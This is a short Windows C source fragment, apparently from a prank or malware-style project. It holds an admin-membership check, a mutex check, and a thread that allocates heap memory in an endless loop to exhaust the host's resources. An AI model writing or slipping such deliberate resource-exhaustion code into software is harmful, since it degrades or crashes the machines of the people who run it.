#include "../../Header-Files/pch.h"
#include "../../Header-Files/N0T-iLLerka.h"

BOOL fnIsUserAdmin(VOID) {
	SID_IDENTIFIER_AUTHORITY siaSNtA = SECURITY_NT_AUTHORITY;
	PSID psAg;
	BOOL bAais = AllocateAndInitializeSid(&siaSNtA, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &psAg);
	if (bAais) {
		if (!CheckTokenMembership(NULL, psAg, &bAais)) {
			bAais = FALSE;
		}

		FreeSid(psAg);
	}

	return bAais;
}

DWORD WINAPI thMemoryLeaker(
	_In_ LPVOID lpParam
) {
	HANDLE hHeap = HeapCreate(NULL, 0, NULL);
	if (hHeap) {
		for (;;) {
			HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x2000);
			Sleep(100);
		}
	} else {
		fnMESSAGEHANDLERW(NULL, L"Couldn't create Heap", L"HeapCreate", MB_ICONERROR);
		return FALSE;
	}
}

#if SYNCHRONIZATION == TRUE
BOOL fnCheckMutexW(
	_In_ LPCWSTR lpName
) {
	if (OpenMutex(SYNCHRONIZE, FALSE, lpName)) {
		return TRUE;
	} else {
		fnMESSAGEHANDLERW(NULL, L"Couldn't Open Mutex", L"OpenMutexW", MB_ICONERROR);
		return FALSE;
	}
}
#endif // SYNCHRONIZATION